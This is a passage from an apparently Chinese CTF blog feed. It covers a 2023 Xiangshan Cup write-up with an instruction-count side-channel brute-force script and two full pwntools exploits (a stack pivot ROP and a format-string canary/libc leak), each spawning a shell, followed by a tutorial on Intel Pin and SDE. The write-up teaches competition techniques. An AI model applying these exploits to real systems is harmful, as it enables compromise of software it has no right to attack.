title="nesting"></a>nesting</h2><p>虚拟机逆向</p><p>vm题的一些思路</p><p>1.还原结构体和switch跳表，读懂vm代码，写代码将opcode转化成汇编指令语句然后再逆向汇编代码，这种方法效率最低，做一题需要很久，像这次比赛两个小时肯定不够，除非做到过类似的。</p><p>2.软件分析工具和脚本。</p><p>3.爆破。主要用于程序对flag(input)的检测是逐位的情况下，每一位的对错都会导致执行流的改变，执行时间或执行指令数量相差巨大，这样就能进行侧信道逐位爆破。战队里大佬用侧信道的方式爆破出来了，学习一下。</p><p>首先来逆向代码</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214727.png"></p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214759.png"></p><p>run_vm中的代码比较混乱，主要原因是将a1识别成了数组，并将swtich语句识别成了if-else语句，需要创建结构体对a1进行重定义并恢复switch跳表</p><p>tips:ida7.7及以上可以识别出switch语句，不需要手动恢复</p><p><a href="https://blog.csdn.net/hgy413/article/details/7104304">ida创建结构体参考</a>       <a href="https://blog.csdn.net/huzai9527/article/details/121204850">ida修复switch跳表参考</a></p><p>跳表修复时Default jump address不设定好的话，会出现多余的case</p><p>结构体创建完后将run_vm函数的指向opcode的参数定义成刚刚创建的结构体(选中,右键, Convert to struct)</p><p>修复前</p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ截图20231019222157.png" alt style="zoom:50%;"><p>修复后</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019223303-1697726007256.png"></p><p>现在代码就比较美观了，但是虚拟机的逻辑还是很复杂,所以不逆了</p><p>程序运行后会让你输入flag并检测flag是否正确</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Input</span> your flag:<br></code></pre></td></tr></table></figure><p>这里用sde来统计程序运行到的指令数量，结果会在命令行以ICOUNT: 3421916的形式输出，这也方便爆破脚本的编写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sde -icount -- ./nesting<br></code></pre></td></tr></table></figure><p>可以发现每多输入一位，总指令数都会增加20万左右</p><p>flag的前4位必定是”flag”，分别输入”1111”,”f111”，”fl11”，”fla1”，”flag”可以发现在位数相同的情况下，flag每正确一位总指令数会增加55000左右，说明flag是逐位check的，并且不同结果的执行流长度相差较大，可以通过这一点来爆破flag</p><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>p = process([<span class="hljs-string">&#x27;sde64&#x27;</span>,<span class="hljs-string">&#x27;-icount&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;./nesting&#x27;</span>])<br>p.recvuntil(<span class="hljs-string">&#x27;Input your flag:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ICOUNT:&#x27;</span>)<br>icount = <span class="hljs-built_in">int</span>(p.recvline())<br>p.close()<br><span class="hljs-keyword">return</span> icount<br><br>table = <span class="hljs-string">&#x27;0123456789abcdef-&#125;&#x27;</span><br><span class="hljs-comment">#table = string.printable</span><br>flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>t1 = run(flag+<span class="hljs-string">&#x27;#&#x27;</span>)<br>ok = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>t2 = run(flag+ch)<br><span class="hljs-keyword">if</span>(t2-t1&gt;<span class="hljs-number">50000</span>):<br>flag = flag + ch<br>ok = <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(ok==<span class="hljs-number">0</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;result : &#x27;</span>+flag)<br>exit()<br><span class="hljs-comment">#flag&#123;2c7c093b-f648-11ed-a716-701ab8caaafe&#125;</span><br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>main函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232915.png"></p><p>vuln函数</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231029232947.png"></p><p>先读取0x20的数据到bss段，再读取4字节数据，等于0x12345678的话vuln函数中可以栈溢出0x10字节，可以覆盖rbp和返回地址</p><p>思路是栈迁移到bss段，跳转到vuln中的read函数，向bss中的rbp-0x30处读入0x40的数据,不断重复构造。</p><p>注意第二次和第三次执行vuln中的read函数时ROP是在read函数中进行的，read函数本身没有push rbp和leave，只有ret，利用read中的ret返回到bss中的p64(rbp_ret) + p64(bss_addr-0x30-8) + p64(leave_ret)来反复在bss段进行ROP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io,<span class="hljs-string">&#x27;b main&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>rbp_ret = <span class="hljs-number">0x401262</span><br>  <br>rdi_ret = <span class="hljs-number">0x401353</span><br><br>puts_got = <span class="hljs-number">0x404018</span><br><br>puts_plt = <span class="hljs-number">0x401080</span><br><br>bss_addr = <span class="hljs-number">0x4050A0</span><br><br>leave_ret = <span class="hljs-number">0x4012E0</span><br><br>vuln_read = <span class="hljs-number">0x401230</span> <br><br>io.recvuntil(<span class="hljs-string">&#x27;lets travel again!&#x27;</span>)<br>bss1 = p64(bss_addr) + p64(vuln_read)<br>io.send(bss1)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input your setp number&#x27;</span>)<br>io.send(<span class="hljs-string">b&#x27;\x78\x56\x34\x12&#x27;</span>)<br><br><span class="hljs-comment">#debug()</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;TaiCooLa&#x27;</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(bss_addr) + p64(leave_ret)<br>io.send(payload1)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>bss2 = p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(rbp_ret) + p64(bss_addr) + p64(vuln_read) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(bss2)<br><br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>success(<span class="hljs-string">&#x27;puts_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>binsh = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sleep(<span class="hljs-number">0.5</span>)<br>payload2 = p64(rdi_ret) + p64(binsh) + p64(system_addr) +  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(rbp_ret) + p64(bss_addr-<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>) + p64(leave_ret)<br>io.send(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>本地运行条件：</p><ul><li><p>python3.7并安装numpy库，<a href="https://blog.csdn.net/qq_51116518/article/details/130184514">Ubuntu 下载并切换Python默认版本（无痛顺畅版）</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看并切换python版本</span><br>sudo update-alternatives --config python<br></code></pre></td></tr></table></figure></li><li><p>创建.&#x2F;tmp文件夹</p></li><li><p>在import app前添加</p></li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">sys.path.<span class="hljs-keyword">append</span>(&#x27;path_to/<span class="hljs-keyword">app</span>.cpython-37m-x86_64-linux-gnu.<span class="hljs-keyword">so</span>&#x27;)<br></code></pre></td></tr></table></figure><p>查看保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">checksec app.cpython-37m-x86_64-linux-gnu.so</span>  <br>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br>    RPATH:    &#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;<br></code></pre></td></tr></table></figure><p>打开ida，通过查看字符串交叉引用找到Welcome2Pwnthon函数</p><p>发现泄露了app_so库中__pyx_f_3app_get_info函数的地址，第一次read后有格式化字符串漏洞，第二次read存在栈溢出。</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231031125959.png"></p><p>用gdb调试，在栈上找到了open64函数，并且在canary之前，那么一次格式化字符串可以泄露libc+canary</p><p>exp，ubuntu2004本机打通了，其它环境可能open64和canary的偏移要修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>io = process([<span class="hljs-string">&#x27;python3.7&#x27;</span>,<span class="hljs-string">&#x27;main.py&#x27;</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io,<span class="hljs-string">&#x27;b _pyx_f_3app_Welcome2Pwnthon&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Give you a gift &#x27;</span>)<br>app_info = <span class="hljs-built_in">int</span>(io.recv(),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;app_info = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_info))<br>app_base = app_info - <span class="hljs-number">0x68b0</span><br>success(<span class="hljs-string">&#x27;app_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(app_base))<br><br><span class="hljs-comment">#debug()</span><br>io.sendline(<span class="hljs-string">&#x27;%p-&#x27;</span>*<span class="hljs-number">35</span>)<br>datas = io.readline().decode().split(<span class="hljs-string">&quot;-&quot;</span>)<br>open64_addr = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">23</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">232</span><br>canary = <span class="hljs-built_in">int</span>(datas[<span class="hljs-number">29</span>],<span class="hljs-number">16</span>)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;open64&#x27;</span>,open64_addr)<br>libc_base = open64_addr - libc.dump(<span class="hljs-string">&#x27;open64&#x27;</span>)<br>success(<span class="hljs-string">&#x27;libc_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>rdi_ret = app_base + <span class="hljs-number">0x3f8f</span><br>ret = app_base + <span class="hljs-number">0x301a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.xmcve.com/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF2023-Writeup/">星盟2023香山杯2023香山杯wp</a></p><p>ArrestYou香山杯2023香山杯wp，公众号山海之关</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态二进制插桩工具Pin和pintools</title>
    <link href="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/"/>
    <url>/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/</url>
    
    <content type="html"><![CDATA[<h2 id="Pin简介"><a href="#Pin简介" class="headerlink" title="Pin简介"></a>Pin简介</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html">Intel官方文档 Pin</a>，概述，下载，手册等都有</p><p>Pin是intel开发的一个<strong>动态二进制插桩</strong>工具，提供了丰富的API，支持windows、linux、macos，适用于 IA-32、x86-64 和 MIC 指令集架构。</p><p>动态二进制插桩（Dynamic Binary Instrumentation，DBI）的含义：不需要源代码，可以在二进制可执行文件文件的任意位置插入任意的代码 (C&#x2F;C++ 编写)，可以将代码动态地添加到正在执行地可执行文件中。目前的DBI平台有Pin、DynamoRIO、Valgrind等。</p><p>基于Pin提供的API开发(c,c++,asm)的工具为pintools。Pin最初是计算机体系结构分析工具，但其灵活的API和活跃的社区（称为“ <a href="https://groups.io/g/pinheads">Pinheads</a> ”）创建了一组用于安全、仿真和并行程序分析的多样化工具。</p><p>Pin的功能：可以用自己的函数替换程序中的函数，并且在自己的函数中调用被替换的函数；可以在指令中插入对检测函数的调用，使得在执行指令时执行检测函数，同时可以给检测函数传递参数(寄存器值、指令读写的内存地址、寄存器上下文)；可以随时attach和detach进程，即可以自定义在程序中需要插桩和检测的部分；可以追踪函数调用以及syscall，检测&#x2F;改变参数；可以配合调试器（如gdb）使用，实现调试器的一些拓展功能；跟踪应用程序子线程；拦截signal信号；检测进程树等。</p><h2 id="Pintool使用"><a href="#Pintool使用" class="headerlink" title="Pintool使用"></a>Pintool使用</h2><p>先看readme，介绍了pintools的编译和基本使用</p><p>readme演示的是opcodemix，它可以用来分析程序包含的不同指令组合的数目，比如可以比较两款编译器编译生成的文件的指令组合的差异</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">This</span> example applies to a <span class="hljs-number">64</span>-bit application. <span class="hljs-keyword">For</span> a <span class="hljs-number">32</span>-bit application please use <span class="hljs-string">&quot;obj-ia32&quot;</span><br>instead of <span class="hljs-string">&quot;obj-intel64&quot;</span> and add <span class="hljs-string">&quot;TARGET=ia32&quot;</span> to the make command.<br><br>To build and run a sample tool on Linux*:<br><br>    cd <span class="hljs-keyword">source</span><span class="hljs-regexp">/tools/</span>SimpleExamples<br>    make obj-intel64/opcodemix.so<br>    ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/pin -t obj-intel64/</span>opcodemix.so -- <span class="hljs-regexp">/bin/</span>ls<br><br>    <span class="hljs-keyword">This</span> will instrument and run <span class="hljs-regexp">/bin/</span>ls, the output <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> tool is in<br>    opcodemix.out.<br></code></pre></td></tr></table></figure><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/pin-a-binary-instrumentation-tool-downloads.html">下载Pin</a></p><p>编译ManualExamples下的所有Pintool(64位)，编译生成的文件会放在obj-intel64目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">source</span>/tools/ManualExamples</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make all TARGET=intel64</span><br></code></pre></td></tr></table></figure><p>使用编译好的工具，我们需要.so文件-t指明要使用的pintool，–后面是要插桩运行的程序</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/pin -t obj-intel64/i</span>nscount0.so -- <span class="hljs-regexp">/bin/</span>ls<br></code></pre></td></tr></table></figure><p>这里使用的是inscount0,可以统计运行的指令数量，结果保存在运行时所在目录下的inscount.out文件，inscount0、incount1、inscount2的区别在于后者对运行效率进行了优化。</p><h2 id="Pintool架构"><a href="#Pintool架构" class="headerlink" title="Pintool架构"></a>Pintool架构</h2><p>windows和linux下Pin的大致架构都是如下</p><ul><li>供 pintool 调用的API库。Linux下是instrumentation api 库，windows中是PIN.LIB；</li><li>VM：即 virtual machine，它的功能主要是插桩并执行程序，过程类似于即时编译，只是编译变成了插桩。大致流程是：先对部分代码进行插桩，放到code cache中运行，运行时需要跳转到未插桩的代码时再对相应代码进行插桩并放入code cache。linux中包含了 emulation unit 用来处理系统调用，JIT 编译器负责编译和插桩，每次取一个 trace 编译后送到 code cache 中；windows原理相同，主要功能集中在PINVM.DLL，执行过程大概是启动pin.exe以debugger的模式，附加要分析程序的进程 -&gt; 注入pinvm.dll-&gt;注入pintool的dll-&gt;开始运行。</li><li>code cache：用来存储插桩后的代码，真正执行的是 code cache 中的代码，原目标插桩文件中的代码不会执行。</li></ul><p>linux下的架构</p><p><a href="https://blog.csdn.net/T2777/article/details/121282703#Pin%20%E6%80%BB%E7%BB%93%F0%9F%93%98">来源</a></p><p><img src="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/1.png" alt="1"></p><p>windows下的架构</p><p><a href="https://www.intel.cn/content/dam/develop/external/us/en/documents/cgo2013-256675.pdf">来源</a></p><p><img src="/2023/10/13/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9pin%E5%92%8Cpintools/2.png" alt="2"></p><h2 id="编写自己的Pintools"><a href="#编写自己的Pintools" class="headerlink" title="编写自己的Pintools"></a>编写自己的Pintools</h2><p>阅读不同版本Pin对应的用户手册，其中有详细的API及示例，如<a href="https://software.intel.com/sites/landingpage/pintool/docs/98749/Pin/doc/html/index.html">Pin 3.28 User Guide</a></p><p>[<a href="https://www.v4ler1an.com/">V4ler1an的博客</a>]，主要是官方文档的相关内容的整理总结，博主是看雪二进制漏洞板块小版主。</p><h2 id="intel-sde"><a href="#intel-sde" class="headerlink" title="intel sde"></a>intel sde</h2><p><a href="https://www.intel.cn/content/www/cn/zh/developer/articles/tool/software-development-emulator.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN">官方下载及文档</a></p><p>sde基于pin和xed，sde在pin插桩分析的基础上多了仿真的功能，可以在特定指令集架构上运行给定程序并捕获各种性能详细信息，可以供开发人员提前熟悉和探索即将推出的新指令集，为在软件中使用新指令集做准备。</p><p>Intel X86 Encoder Decoder (XED) 是一个软件库，用于编码和解码 X86（IA32 和 Intel64）指令。解码器采用 1-15 字节的序列以及机器模式信息，并生成描述操作码、操作数和标志的数据结构。编码器采用类似的数据结构并生成 1 到 15 个字节的序列。反汇编本质上是对数据结构的打印。</p><p>即XED可以对x86&#x2F;64代码进行反汇编以及将汇编转化为机器码,可执行程序xed可以反汇编PE和ELF可执行文件。</p><p><strong>sde基本使用</strong></p><p>中括号表示可选参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">path-to-kit/sde [sde args] -- user-application [app args]<br></code></pre></td></tr></table></figure><p>用sde运行cmd或shell可以使所有在cmd&#x2F;shell中运行的程序都在sde的控制之下，sde可以收集并分析所有该命令行中的内容。</p><p>例如：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sde -icount -- <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看帮助</span><br>-help   <br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看更多更详细的帮助，可查看支持仿真的cpu和指令集以及其对应的命令行参数<span class="hljs-built_in">id</span>，可查看分析工具更详细的参数</span><br>-help-long<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看运行到的不同函数中不同指令的数量统计，输出在文件中</span><br>-mix<br><span class="hljs-meta prompt_">#</span><span class="language-bash">统计运行的指令数量，有终端输出和文件输出</span><br>-icount<br><span class="hljs-meta prompt_">#</span><span class="language-bash">更多功能及参数请看文档</span><br></code></pre></td></tr></table></figure><h2 id="Pin-in-CTF"><a href="#Pin-in-CTF" class="headerlink" title="Pin in CTF"></a>Pin in CTF</h2><p>因为Pin能够直接对可执行程序动态插桩进行信息收集，所以求解部分ctf题有奇效。</p><p>主要用于程序复杂（如复杂的vm逆向以及混淆题）但是对flag(input)的检测是逐位的情况下，每一位的对错都会导致执行流的改变，执行时间或执行指令数量相差巨大，这样就能进行侧信道逐位爆破。</p><p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/instrumentation/intel_pin/">[ctf-wiki]intel pin</a>上有两道例题</p><h5 id="2023香山杯nesting"><a href="#2023香山杯nesting" class="headerlink" title="2023香山杯nesting"></a>2023香山杯nesting</h5><p>一道vm题，但这里可以不用ida分析</p><p>程序运行后会让你输入flag并检测flag是否正确</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Input</span> your flag:<br></code></pre></td></tr></table></figure><p>用sde来统计程序运行到的指令数量，结果会在命令行以ICOUNT: 3421916的形式输出，这也方便爆破脚本的编写</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sde -icount -- ./nesting<br></code></pre></td></tr></table></figure><p>可以发现每多输入一位，总指令数都会增加20万左右</p><p>flag的前4位必定是”flag”，分别输入”1111”,”f111”，”fl11”，”fla1”，”flag”可以发现在位数相同的情况下，flag每正确一位总指令数会增加55000左右，说明flag是逐位check的，并且不同结果的执行流长度相差较大，可以通过这一点来爆破flag</p><p>爆破脚本，来自Re神</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>p = process([<span class="hljs-string">&#x27;sde64&#x27;</span>,<span class="hljs-string">&#x27;-icount&#x27;</span>,<span class="hljs-string">&#x27;--&#x27;</span>,<span class="hljs-string">&#x27;./nesting&#x27;</span>])<br>p.recvuntil(<span class="hljs-string">&#x27;Input your flag:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ICOUNT:&#x27;</span>)<br>icount = <span class="hljs-built_in">int</span>(p.recvline())<br>p.close()<br><span class="hljs-keyword">return</span> icount<br><br>table = <span class="hljs-string">&#x27;0123456789abcdef-&#125;&#x27;</span><br><span class="hljs-comment">#table = string.printable</span><br>flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>t1 = run(flag+<span class="hljs-string">&#x27;#&#x27;</span>)<br>ok = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>t2 = run(flag+ch)<br><span class="hljs-keyword">if</span>(t2-t1&gt;<span class="hljs-number">50000</span>):<br>flag = flag + ch<br>ok = <span class="hljs-number">1</span><br><span 